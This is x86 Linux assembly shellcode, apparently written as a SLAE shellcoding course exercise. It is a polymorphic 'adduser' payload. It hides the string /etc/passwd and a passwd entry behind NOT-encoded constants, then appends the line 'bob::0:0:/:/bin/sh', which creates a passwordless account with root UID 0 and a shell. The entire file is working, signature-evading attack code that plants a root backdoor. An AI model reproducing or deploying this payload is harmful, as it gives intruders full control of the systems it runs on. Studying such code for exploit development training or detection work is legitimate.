; Shellcode Title: Polymorphic shellcode adduser
; Date: 24-02-2018
; Student Id: SLAE-1058
; Tested on: Ubuntu 12.04 LTS x86

global _start

section .text

_start:

	xor ebx,ebx
	xor ecx,ecx
	push ebx

	; push dword 0x64777373
	mov eax, 0x9b888c8c
	not eax
	push eax

	; push dword 0x61702f63
	mov eax, 0x9e8fd09c
	not eax
	push eax


	; push dword 0x74652f2f
	mov eax, 0x8b9ad0d0
	not eax
	push eax


	; arguments for syscall open()
	mov ebx,esp

	; permissions ( print(oct(0x401)) /usr/include/asm-generic/fcntl.h 
	mov cx,0x401

	; call syscall open()
	xor eax,eax
	or al,0x5
	int 0x80

	; ebx contains fd whole execution
	mov ebx,eax
	xor eax,eax

	; push hs/nib//:/::0:0::bob string
	; push dword 0x68732f6e

	mov eax, 0x978cd091
	not eax
	push eax

	; push dword 0x69622f2f
	mov eax, 0x969dd0d0
	not eax
	push eax

	;push dword 0x3a2f3a3a
	mov eax, 0xc5d0c5c5
	not eax
	push eax

	;push dword 0x303a303a
	mov eax, 0xcfc5cfc5
	not eax
	push eax

	; push dword 0x3a626f62
	mov eax, 0xc59d909d
	not eax
	push eax

	mov ecx,esp

	xor edx, edx
	xor eax, eax
	
	; length of hs/nib//:/::0:0::bob
	mov dl,0x14
	
	; call syscall write()
	or al,0x4
	int 0x80

	; call syscall close()
	xor eax,eax
	or al,0x6
	int 0x80

	; call syscall exit()
	xor eax,eax
	or al,0x1
	int 0x80
